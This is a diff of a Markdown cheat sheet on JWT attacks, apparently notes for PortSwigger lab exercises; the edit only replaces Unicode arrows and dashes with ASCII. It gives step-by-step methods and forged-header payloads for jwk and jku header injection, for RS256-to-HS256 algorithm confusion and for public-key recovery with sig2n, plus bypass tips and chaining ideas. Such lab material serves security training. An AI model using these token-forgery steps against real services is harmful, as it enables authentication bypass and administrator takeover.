@@ -1,84 +1,84 @@
-# JWT attacks — Key injection and algorithm confusion
+# JWT attacks - Key injection and algorithm confusion
 
 Servers that support RSA-signed JWTs may trust attacker-supplied key material embedded in the token itself (jwk header), fetched from an attacker-controlled URL (jku header), or use the RSA public key as an HS256 HMAC secret (algorithm confusion). All three allow forging valid tokens as administrator.
 
 ## Quick reference
 ```
-# jwk header injection (Burp JWT Editor → Attack → Embedded JWK)
-# Generates RSA key pair, embeds public key in token header → server trusts it
+# jwk header injection (Burp JWT Editor -> Attack -> Embedded JWK)
+# Generates RSA key pair, embeds public key in token header -> server trusts it
 Header: {"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","kid":"...","n":"..."},"kid":"..."}
-Payload sub=administrator → sign with attacker private key → server verifies with embedded public key
+Payload sub=administrator -> sign with attacker private key -> server verifies with embedded public key
 
 # jku header injection (attacker-hosted JWK Set)
 # 1. Generate RSA key pair in JWT Editor
 # 2. Host JWK Set on exploit server: {"keys":[{...public-key...}]}
 # 3. Set jku to exploit server URL + kid matching hosted key
 Header: {"alg":"RS256","kid":"attacker-kid","jku":"https://EXPLOIT-SERVER/exploit"}
-# 4. Sign with attacker private key → server fetches jku → verifies → admin access
+# 4. Sign with attacker private key -> server fetches jku -> verifies -> admin access
 
-# Algorithm confusion (RS256 → HS256 with public key as HMAC secret)
-# 1. Fetch /jwks.json → copy public key JWK
-# 2. JWT Editor: New RSA Key (paste JWK) → Copy Public Key as PEM → base64-encode
-# 3. New Symmetric Key → k = base64url(PEM-bytes)
-# 4. Change alg=HS256, sub=administrator → Sign with symmetric key
+# Algorithm confusion (RS256 -> HS256 with public key as HMAC secret)
+# 1. Fetch /jwks.json -> copy public key JWK
+# 2. JWT Editor: New RSA Key (paste JWK) -> Copy Public Key as PEM -> base64-encode
+# 3. New Symmetric Key -> k = base64url(PEM-bytes)
+# 4. Change alg=HS256, sub=administrator -> Sign with symmetric key
 # Server: HMAC-SHA256(token, RSA-pubkey) == HMAC-SHA256(token, RSA-pubkey) ✓
 
 # Recover RSA public key from two tokens (no /jwks.json)
 docker run --rm portswigger/sig2n <token1> <token2>
-# → outputs X.509 and PKCS1 keys + tampered JWT for each
-# Test tampered JWT on /my-account → 200 = correct key → use for alg confusion
+# -> outputs X.509 and PKCS1 keys + tampered JWT for each
+# Test tampered JWT on /my-account -> 200 = correct key -> use for alg confusion
 ```
 
 ## Root cause
 - **jwk injection:** JWT spec allows embedding key in header; some libraries fetch and trust it without allowlisting.
 - **jku injection:** Libraries that fetch the JWK Set URL from the token header, treating any URL as valid.
-- **Algorithm confusion:** Library using the same key object for both RSA and HMAC verification — public key bytes become the HMAC secret; attacker knows the public key and can forge HS256-signed tokens.
+- **Algorithm confusion:** Library using the same key object for both RSA and HMAC verification - public key bytes become the HMAC secret; attacker knows the public key and can forge HS256-signed tokens.
 
 ## Find it
-1. Decode JWT header → look for `jwk`, `jku`, `x5u`, `x5c` parameters — any present = injection target.
-2. Check `/jwks.json` endpoint — public key exposure enables algorithm confusion.
-3. Change alg to HS256 with a known key → does server accept? → confusion likely.
-4. No JWK endpoint but RS256 → try sig2n with two captured tokens.
+1. Decode JWT header -> look for `jwk`, `jku`, `x5u`, `x5c` parameters - any present = injection target.
+2. Check `/jwks.json` endpoint - public key exposure enables algorithm confusion.
+3. Change alg to HS256 with a known key -> does server accept? -> confusion likely.
+4. No JWK endpoint but RS256 -> try sig2n with two captured tokens.
 
 ## Technique
 
 **jwk injection (Lab 4):**
-1. Burp JWT Editor → New RSA Key → Generate → OK.
-2. GET /admin → JSON Web Token tab → payload: sub="administrator".
-3. Attack → Embedded JWK → select generated key → OK.
+1. Burp JWT Editor -> New RSA Key -> Generate -> OK.
+2. GET /admin -> JSON Web Token tab -> payload: sub="administrator".
+3. Attack -> Embedded JWK -> select generated key -> OK.
 4. Header now has `jwk` field with your public key.
-5. Send → server uses embedded public key to verify → 200 → delete carlos.
+5. Send -> server uses embedded public key to verify -> 200 -> delete carlos.
 
 **jku injection (Lab 5):**
-1. Burp JWT Editor → New RSA Key → Generate → note the kid value.
-2. Exploit server → Body: `{"keys":[` then right-click your key → Copy Public Key as JWK → paste → `]}`
+1. Burp JWT Editor -> New RSA Key -> Generate -> note the kid value.
+2. Exploit server -> Body: `{"keys":[` then right-click your key -> Copy Public Key as JWK -> paste -> `]}`
 3. Store exploit. Copy exploit server domain.
-4. GET /admin → JWT tab → header: change `kid` to match your key's kid → add `jku` = exploit server URL.
+4. GET /admin -> JWT tab -> header: change `kid` to match your key's kid -> add `jku` = exploit server URL.
 5. Payload: sub="administrator".
-6. Sign → Don't modify header → select RSA key → OK.
-7. Send → server fetches jku → verifies with hosted public key → 200 → delete carlos.
+6. Sign -> Don't modify header -> select RSA key -> OK.
+7. Send -> server fetches jku -> verifies with hosted public key -> 200 -> delete carlos.
 
-**Algorithm confusion (Lab 7 — /jwks.json available):**
-1. Browse to `/jwks.json` → copy the JWK object from `keys` array.
-2. JWT Editor → New RSA Key → paste JWK → OK.
-3. Right-click key → Copy Public Key as PEM → Burp Decoder → base64-encode PEM.
-4. JWT Editor → New Symmetric Key → Generate → replace `k` with the base64-encoded PEM → OK.
-5. GET /admin → JWT tab → header: alg → "HS256". Payload: sub="administrator".
-6. Sign → Don't modify header → select symmetric key → OK.
-7. Send → server verifies HS256 using RSA public key bytes as secret → match → 200 → delete carlos.
+**Algorithm confusion (Lab 7 - /jwks.json available):**
+1. Browse to `/jwks.json` -> copy the JWK object from `keys` array.
+2. JWT Editor -> New RSA Key -> paste JWK -> OK.
+3. Right-click key -> Copy Public Key as PEM -> Burp Decoder -> base64-encode PEM.
+4. JWT Editor -> New Symmetric Key -> Generate -> replace `k` with the base64-encoded PEM -> OK.
+5. GET /admin -> JWT tab -> header: alg -> "HS256". Payload: sub="administrator".
+6. Sign -> Don't modify header -> select symmetric key -> OK.
+7. Send -> server verifies HS256 using RSA public key bytes as secret -> match -> 200 -> delete carlos.
 
-**Algorithm confusion — no exposed key (Lab 8):**
-1. Log in → copy JWT (token1). Log out → log in again → copy JWT (token2).
+**Algorithm confusion - no exposed key (Lab 8):**
+1. Log in -> copy JWT (token1). Log out -> log in again -> copy JWT (token2).
 2. `docker run --rm portswigger/sig2n <token1> <token2>`
 3. Output contains one or more candidate X.509 keys + pre-tampered test JWTs.
-4. Test each tampered JWT: GET /my-account → 200 = correct key, 302 = wrong.
-5. JWT Editor → New Symmetric Key → k = base64(correct X.509 key) → OK.
+4. Test each tampered JWT: GET /my-account -> 200 = correct key, 302 = wrong.
+5. JWT Editor -> New Symmetric Key -> k = base64(correct X.509 key) -> OK.
 6. Follow algorithm confusion steps above (alg=HS256, sub=administrator, sign with symmetric key).
-7. GET /admin → delete carlos.
+7. GET /admin -> delete carlos.
 
 ## Payload arsenal
 ```
-# jwk header (auto-generated by JWT Editor → Attack → Embedded JWK)
+# jwk header (auto-generated by JWT Editor -> Attack -> Embedded JWK)
 {
   "alg": "RS256",
   "jwk": {
@@ -109,7 +109,7 @@ docker run --rm portswigger/sig2n <token1> <token2>
   ]
 }
 
-# Algorithm confusion — symmetric key JSON (k = base64url of PEM bytes)
+# Algorithm confusion - symmetric key JSON (k = base64url of PEM bytes)
 {
   "kty": "oct",
   "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0t..."
@@ -125,43 +125,43 @@ docker run --rm -it portswigger/sig2n <token1> <token2>
 | jku allowlisted to own domain | Combine with open redirect on allowed domain to redirect to exploit server |
 | jwk header not processed | Try jku, x5u, x5c headers instead |
 | /jwks.json not exposed | Use sig2n to recover public key from two captured tokens |
-| HS256 rejected, RS256 enforced | Still try alg confusion — confusion bugs often ignore your alg field |
+| HS256 rejected, RS256 enforced | Still try alg confusion - confusion bugs often ignore your alg field |
 
 ## Exploitation walkthrough
-**jwk:** Generate RSA keypair → embed public key in token header via Embedded JWK attack → sign with private key → server trusts embedded key → admin access.
+**jwk:** Generate RSA keypair -> embed public key in token header via Embedded JWK attack -> sign with private key -> server trusts embedded key -> admin access.
 
-**jku:** Generate RSA keypair → host public key in JWK Set on exploit server → set jku header to exploit server URL → sign with private key → server fetches JWK Set → verifies → admin access.
+**jku:** Generate RSA keypair -> host public key in JWK Set on exploit server -> set jku header to exploit server URL -> sign with private key -> server fetches JWK Set -> verifies -> admin access.
 
-**Alg confusion:** Fetch RSA public key from /jwks.json → convert to base64-PEM → use as HS256 HMAC secret → sign with sub=administrator → server verifies HS256 using its RSA public key → match → admin access.
+**Alg confusion:** Fetch RSA public key from /jwks.json -> convert to base64-PEM -> use as HS256 HMAC secret -> sign with sub=administrator -> server verifies HS256 using its RSA public key -> match -> admin access.
 
 ## Chaining
-- JWT forgery → /admin access → [Access-control](../../Access-control/)
-- jku injection → server fetches attacker URL → [SSRF](../../SSRF/) if internal URLs accepted
-- Alg confusion often combined with exposed /jwks.json → information disclosure
+- JWT forgery -> /admin access -> [Access-control](../../Access-control/)
+- jku injection -> server fetches attacker URL -> [SSRF](../../SSRF/) if internal URLs accepted
+- Alg confusion often combined with exposed /jwks.json -> information disclosure
 
 ## Tools
-- **Burp JWT Editor** — RSA/ECDSA key gen, Embedded JWK attack, signing
-- **docker portswigger/sig2n** — recover RSA public key from pair of signed tokens
-- **Burp Decoder** — base64-encode PEM for algorithm confusion key construction
+- **Burp JWT Editor** - RSA/ECDSA key gen, Embedded JWK attack, signing
+- **docker portswigger/sig2n** - recover RSA public key from pair of signed tokens
+- **Burp Decoder** - base64-encode PEM for algorithm confusion key construction
 
 ## Labs
 
 ### JWT authentication bypass via jwk header injection [Practitioner]
-Generate RSA key pair → JWT Editor → Attack → Embedded JWK. Sub=administrator. Server checks the `jwk` header for the verification key and trusts it. Key insight: the spec allows jwk in the header; vulnerable libraries trust any embedded key without allowlisting.
+Generate RSA key pair -> JWT Editor -> Attack -> Embedded JWK. Sub=administrator. Server checks the `jwk` header for the verification key and trusts it. Key insight: the spec allows jwk in the header; vulnerable libraries trust any embedded key without allowlisting.
 
 ### JWT authentication bypass via jku header injection [Practitioner]
-Generate RSA key pair → host public JWK Set on exploit server → set jku header + matching kid → sign with private key. Server fetches jku URL and uses the hosted public key to verify. Key insight: jku is an SSRF-style vector — server fetches attacker-controlled URL for key material.
+Generate RSA key pair -> host public JWK Set on exploit server -> set jku header + matching kid -> sign with private key. Server fetches jku URL and uses the hosted public key to verify. Key insight: jku is an SSRF-style vector - server fetches attacker-controlled URL for key material.
 
 ### JWT authentication bypass via algorithm confusion [Expert]
-Fetch RSA public key from /jwks.json → convert to PEM → base64-encode → create HS256 symmetric key. Change alg=HS256, sub=administrator → sign. The server's RSA/HMAC-confused library verifies HS256 using the public key bytes as the HMAC secret — which matches because we signed with the same bytes. Key insight: a library that switches algorithm based on the token's alg claim, using the same key material for both RS256 and HS256, is fundamentally broken.
+Fetch RSA public key from /jwks.json -> convert to PEM -> base64-encode -> create HS256 symmetric key. Change alg=HS256, sub=administrator -> sign. The server's RSA/HMAC-confused library verifies HS256 using the public key bytes as the HMAC secret - which matches because we signed with the same bytes. Key insight: a library that switches algorithm based on the token's alg claim, using the same key material for both RS256 and HS256, is fundamentally broken.
 
 ### JWT authentication bypass via algorithm confusion with no exposed key [Expert]
-Collect two valid JWTs → `docker portswigger/sig2n` recovers RSA public key candidates mathematically. Test candidates → find correct X.509 key → use as HS256 HMAC secret. Key insight: RSA public keys can be recovered from two signatures over known messages; /jwks.json is not required.
+Collect two valid JWTs -> `docker portswigger/sig2n` recovers RSA public key candidates mathematically. Test candidates -> find correct X.509 key -> use as HS256 HMAC secret. Key insight: RSA public keys can be recovered from two signatures over known messages; /jwks.json is not required.
 
 ## Real-world notes
 - jwk/jku injection affects older Node.js `jsonwebtoken` library versions and many Java JWT libraries.
 - Algorithm confusion is particularly dangerous in microservice architectures where the same key pair is used across services with different JWT libraries.
-- jku/x5u are effectively SSRF gadgets in JWT validators — test for blind SSRF via Collaborator.
+- jku/x5u are effectively SSRF gadgets in JWT validators - test for blind SSRF via Collaborator.
 - sig2n recovery works for both RSA-2048 and RSA-4096; takes longer for larger keys.
 
 ## References
